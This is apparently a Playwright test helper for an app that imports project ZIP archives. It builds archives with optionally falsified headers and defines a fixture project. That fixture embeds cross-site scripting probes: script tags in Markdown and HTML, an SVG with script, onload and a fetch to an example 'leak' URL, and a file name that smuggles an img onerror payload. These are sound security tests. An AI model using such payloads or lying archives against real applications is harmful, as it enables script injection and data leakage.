import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { crc32, deflateRawSync } from 'node:zlib';
import { expect, type Page } from '@playwright/test';

export type Files = Record<string, string | Buffer>;

/** Builds a ZIP. `lie` overrides header fields to make hostile archives. */
export function makeZip(files: Files, lie: { size?: number; store?: boolean } = {}): Buffer {
  const parts: Buffer[] = [];
  const central: Buffer[] = [];
  let at = 0;
  let count = 0;
  for (const [path, data] of Object.entries(files)) {
    const raw = Buffer.isBuffer(data) ? data : Buffer.from(data);
    const packed = lie.store ? raw : deflateRawSync(raw);
    const name = Buffer.from(path);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(name.length, 26);
    const head = Buffer.alloc(46);
    head.writeUInt32LE(0x02014b50, 0);
    head.writeUInt16LE(0x800, 8);
    head.writeUInt16LE(lie.store ? 0 : 8, 10);
    head.writeUInt32LE(crc32(raw) as number, 16);
    head.writeUInt32LE(packed.length, 20);
    head.writeUInt32LE(lie.size ?? raw.length, 24);
    head.writeUInt16LE(name.length, 28);
    head.writeUInt32LE(at, 42);
    parts.push(local, name, packed);
    central.push(head, name);
    at += 30 + name.length + packed.length;
    count++;
  }
  const dir = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(count, 10);
  end.writeUInt32LE(dir.length, 12);
  end.writeUInt32LE(at, 16);
  return Buffer.concat([...parts, dir, end]);
}

/** A 2 × 1 pixel PNG. */
export const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAIAAAABCAYAAAD0In+KAAAAEUlEQVR4nGP4z8DwHwQZGBgAI/gD/ZWr5xIAAAAASUVORK5CYII=', 'base64');

/** An invented project that touches every kind of file. */
export const PROJECT: Files = {
  'shop/README.md': '# Tiny shop\n\nSee ![logo](assets/logo.png) and `main.py`.\n\n<script>window.pwned = 1</script>\n',
  'shop/main.py': 'import json\nimport numpy as np\nfrom prices import LIMIT, total\n\nbasket = [2.0, 3.0]\nresult = total(basket)\nprint(result, LIMIT)\n',
  'shop/prices.py': '"""Prices."""\n\nLIMIT = 10\n\n\ndef total(items):\n    """Adds everything."""\n    summe = 0\n    for item in items:\n        summe += item\n    return summe\n\n\ndef load():\n    return open("data/rows.csv")\n',
  'shop/model.py': 'from sklearn.linear_model import LinearRegression\n\n\ndef train(x, y):\n    model = LinearRegression()\n    model.fit(x, y)\n    return model\n',
  'shop/data/rows.csv': 'name,hours\nnorth,10.5\nsouth,20\n',
  'shop/config.json': '{"mode": "demo", "sizes": [1, 2, 3]}',
  'shop/settings.yaml': 'mode: demo\nlist:\n  - one\n',
  'shop/requirements.txt': 'numpy==1.26.4\nscikit-learn\n',
  'shop/nb.ipynb': JSON.stringify({ metadata: { kernelspec: { language: 'python' } }, cells: [{ cell_type: 'markdown', source: '# Hello' }, { cell_type: 'code', source: 'a = 4\nb = a * 2\nprint(b)', outputs: [] }] }),
  'shop/assets/logo.png': PNG,
  'shop/assets/fake.png': 'this is not an image',
  'shop/assets/draw.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="20"><script>window.top.pwned = 1; fetch("https://example.com/leak")</script><rect width="40" height="20" fill="red" onload="window.top.pwned=1"/><image href="https://example.com/track.png"/></svg>',
  'shop/page.html': '<h1>Hi</h1><script>window.top.pwned = 1</script><img src="assets/logo.png">',
  'shop/blob.bin': Buffer.from([1, 2, 0, 3]),
  'shop/<img src=x onerror=pwned=1>.txt': 'strange name',
  'shop/node_modules/lib/index.js': 'module.exports = 1',
  'shop/inner.zip': makeZip({ 'x.txt': 'x' }),
};

export async function importZip(page: Page, data: Buffer, name = 'shop.zip') {
  await page.goto('#/');
  const input = page.locator('input[type=file][accept*=zip]');
  if (data.length < 40_000_000) {
    await input.setInputFiles({ name, mimeType: 'application/zip', buffer: data });
    return;
  }
  // Large archives come from disk.
  const path = join(mkdtempSync(join(tmpdir(), 'cp-e2e-')), name);
  writeFileSync(path, data);
  await input.setInputFiles(path);
}

export async function openProject(page: Page, files: Files = PROJECT, name = 'shop.zip') {
  await importZip(page, makeZip(files), name);
  await expect(page).toHaveURL(/#\/project\//);
  await ready(page);
}

/** Waits until the background preparation is done. */
export async function ready(page: Page) {
  await expect(page.locator('.side-tabs')).toHaveAttribute('data-preparation', 'done', { timeout: 40_000 });
}

export async function openFile(page: Page, path: string) {
  await page.evaluate((p) => {
    const id = /project\/([^?]+)/.exec(location.hash)![1];
    location.hash = `#/project/${id}?file=${encodeURIComponent(p)}`;
  }, path);
}
